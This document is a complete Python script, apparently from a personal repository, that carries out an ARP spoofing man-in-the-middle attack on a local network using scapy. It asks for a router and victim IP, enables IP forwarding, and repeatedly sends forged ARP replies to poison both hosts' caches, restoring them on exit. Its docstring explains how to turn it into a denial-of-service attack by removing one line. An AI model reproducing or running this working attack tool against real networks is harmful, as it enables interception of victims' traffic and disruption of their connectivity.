from scapy.all import *
import os
import time
"""
!--ARP SPOOFING BY LIAD ELIYAHU--!
This is arp spoofing attack in the same LAN.
MITM attack (forwarding).
You can cause a DoS by not forwarding (redirecting) the packets.
Just remove line 37. 
"""
def spoof(routerIP, victimIP, myHw):
	send(ARP(op = 2, psrc = routerIP, pdst = victimIP, hwsrc=myHw))
	send(ARP(op = 2, psrc = victimIP, pdst = routerIP, hwsrc=myHw))

def get_my_mac():
	macs = [get_if_hwaddr(l) for l in get_if_list()]
	for mac in macs:
		if mac != "00:00:00:00:00:00":
			return mac
	return False

def get_mac(ip):
	pkt = sr1(ARP(pdst = ip))
	if ARP in pkt:
		return pkt[ARP].hwsrc

def reverse_spoof(routerIP, victimIP):
	router_mac = get_mac(routerIP)
	victim_mac = get_mac(victimIP)
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwsrc = victim_mac))
	send(ARP(op = 2, pdst = victimIP, psrc = routerIP , hwsrc = router_mac))


def main():
	routerIP = raw_input("please enter the router's IP address: ")
	victimIP = raw_input("please enter the victim's IP address: ")
	os.system('sudo echo 1 > /proc/sys/net/ipv4/ip_forward')
	try:
		while True:
			print 'spoofing...'
			spoof(routerIP, victimIP, get_my_mac())
			time.sleep(2)
	except:
		reverse_spoof(routerIP, victimIP)
		os.system('sudo echo 0 > /proc/sys/net/ipv4/ip_forward')



if __name__ == "__main__":
	main()
